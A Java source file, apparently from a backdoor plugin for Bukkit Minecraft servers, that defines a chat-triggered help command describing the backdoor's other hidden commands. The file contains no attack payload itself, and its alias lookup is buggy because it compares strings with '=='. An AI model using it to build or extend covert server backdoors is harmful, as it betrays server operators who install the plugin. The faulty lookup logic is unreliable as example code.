package me.tsb.backdoor.commands.help;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "help",
        usage = {"<prefix> <command> <command>"},
        description = "Tells you what the specified command does",
        aliases = {"help"})
public class HelpCommand extends Command {
    private Main main;

    public HelpCommand(Main main) {
        super(main);
        this.main = main;
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        StringBuilder sb = new StringBuilder();
        sb.append("commands: ");

        // There is probably a better way to do this.
        try {
            Command command = null;
            for (Command c : main.getCommandManager().getCommands()) {
                for (String s : c.getAliases()) {
                    if (s == args.get(0)) {
                        command = c;
                        break;
                    }
                }
            }
            sb.append(command.getDescription());

            event.getPlayer().sendMessage(sb.toString());

        } catch (Exception e) {
            main.logger.exception("Failed to find command containing that alias.");
        }
    }
}
